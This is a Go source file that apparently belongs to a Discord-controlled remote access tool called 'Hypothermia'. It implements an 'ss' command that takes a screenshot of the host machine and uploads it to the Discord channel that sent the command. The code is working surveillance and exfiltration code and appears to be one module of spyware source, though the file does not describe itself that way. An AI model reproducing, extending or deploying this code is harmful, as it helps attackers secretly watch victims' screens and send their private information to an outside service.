package commands

import (
	"Hypothermia/src/funcs"

	"github.com/bwmarrin/discordgo"
)

const (
	ssCaptureError  string = "🟥 Failed to capture."
	ssEncodingError string = "🟥 Failed to encode screenshot."
)

func (*ScreenShotCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	buf, err := funcs.Screenshot()
	switch err {
	case -1:
		s.ChannelMessageSendReply(m.ChannelID, ssCaptureError, m.Reference())
		return

	case -2:
		s.ChannelMessageSendReply(m.ChannelID, ssEncodingError, m.Reference())
		return
	}

	s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
		Reference: m.Reference(),
		Files: []*discordgo.File{{
			Name:   "ss.jpg",
			Reader: buf,
		}},
	})
}

func (*ScreenShotCommand) Name() string {
	return "ss"
}

func (*ScreenShotCommand) Info() string {
	return "takes a screenshot"
}

type ScreenShotCommand struct{}
